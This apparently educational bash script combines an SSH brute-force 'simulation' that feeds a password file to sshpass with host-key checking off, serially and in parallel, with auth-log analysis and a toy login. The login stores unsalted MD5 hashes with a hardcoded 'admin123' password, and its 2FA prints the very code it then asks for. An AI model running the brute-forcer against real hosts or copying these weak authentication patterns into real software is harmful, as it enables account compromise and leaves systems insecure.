#!/bin/bash

# Configuration
TARGET_USER="username"
TARGET_HOST="localhost"
PASSWORD_FILE="passwords.txt"
LOG_FILE="/var/log/auth.log"
ALERT_FILE="suspicious_activity.log"

# User credentials and hashes
declare -A USERS
USERS["admin"]="e99a18c428cb38d5f260853678922e03"  # Hashed password: 'admin123'

# Function to simulate brute force login attempts
attempt_login() {
    local password=$1
    echo "Trying password: $password"
    sshpass -p "$password" ssh -o StrictHostKeyChecking=no $TARGET_USER@$TARGET_HOST exit 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "Login successful with password: $password"
        exit 0
    fi
}

# Function to analyze logs for suspicious activities
analyze_logs() {
    echo "Analyzing log file: $LOG_FILE"
    grep "Failed password" $LOG_FILE > $ALERT_FILE
    echo "Failed login attempts logged to $ALERT_FILE"
    grep "authentication failure" $LOG_FILE >> $ALERT_FILE
    echo "Unauthorized access attempts logged to $ALERT_FILE"
    awk '/Failed password/ {print $11}' $LOG_FILE | sort | uniq -c | sort -nr >> $ALERT_FILE
    echo "Unusual patterns logged to $ALERT_FILE"
}

# Function to validate user credentials
login_system() {
    read -p "Username: " username
    read -sp "Password: " password
    echo
    password_hash=$(echo -n "$password" | md5sum | awk '{print $1}')
    if [[ "${USERS[$username]}" == "$password_hash" ]]; then
        echo "Login successful!"
        return 0
    else
        echo "Invalid credentials. Access denied."
        exit 1
    fi
}

# Function for two-factor authentication (2FA)
two_factor_auth() {
    local code=$((RANDOM % 10000))
    echo "Your 2FA code is: $code"
    read -p "Enter 2FA code: " input_code
    if [[ "$input_code" == "$code" ]]; then
        echo "2FA successful!"
        return 0
    else
        echo "Invalid 2FA code. Access denied."
        exit 1
    fi
}

# Function to send email alerts
send_alert() {
    local message=$1
    echo "$message" | mail -s "Security Alert" user@example.com
}

# Function to display help
show_help() {
    echo "Usage: $0 [options]"
    echo "Options:"
    echo "  -h, --help      Show this help message"
    echo "  -a, --analyze   Run log analysis"
    echo "  -s, --simulate  Run brute force simulation"
    echo "  -p, --parallel  Run brute force simulation in parallel"
}

# Function to simulate brute force login attempts in parallel
attempt_login_parallel() {
    local password=$1
    echo "Trying password: $password"
    sshpass -p "$password" ssh -o StrictHostKeyChecking=no $TARGET_USER@$TARGET_HOST exit 2>/dev/null &
}

# Function to handle user account management
user_management() {
    case $1 in
        add)
            read -p "New username: " new_user
            read -sp "New password: " new_pass
            echo
            new_pass_hash=$(echo -n "$new_pass" | md5sum | awk '{print $1}')
            USERS["$new_user"]="$new_pass_hash"
            echo "User $new_user added."
            ;;
        delete)
            read -p "Username to delete: " del_user
            unset USERS["$del_user"]
            echo "User $del_user deleted."
            ;;
        list)
            echo "Current users:"
            for user in "${!USERS[@]}"; do
                echo "$user"
            done
            ;;
        *)
            echo "Usage: $0 user [add|delete|list]"
            ;;
    esac
}

# Parse command-line arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        -h|--help)
            show_help
            exit 0
            ;;
        -a|--analyze)
            RUN_ANALYZE=true
            shift
            ;;
        -s|--simulate)
            RUN_SIMULATE=true
            shift
            ;;
        -p|--parallel)
            RUN_PARALLEL=true
            shift
            ;;
        user)
            user_management "$2"
            exit 0
            ;;
        *)
            echo "Unknown option: $1"
            show_help
            exit 1
            ;;
    esac
done

# Main execution flow
login_system
two_factor_auth

if [[ "$RUN_SIMULATE" == true ]]; then
    echo "Starting brute force attack simulation..."
    while IFS= read -r password; do
        attempt_login "$password"
    done < "$PASSWORD_FILE"
    echo "Brute force attack simulation completed."
fi

if [[ "$RUN_PARALLEL" == true ]]; then
    echo "Starting brute force attack simulation in parallel..."
    while IFS= read -r password; do
        attempt_login_parallel "$password"
    done < "$PASSWORD_FILE"
    wait
    echo "Brute force attack simulation in parallel completed."
fi

if [[ "$RUN_ANALYZE" == true ]]; then
    echo "Starting log analysis..."
    analyze_logs
    echo "Log analysis completed."
    send_alert "Suspicious activities detected and logged."
fi
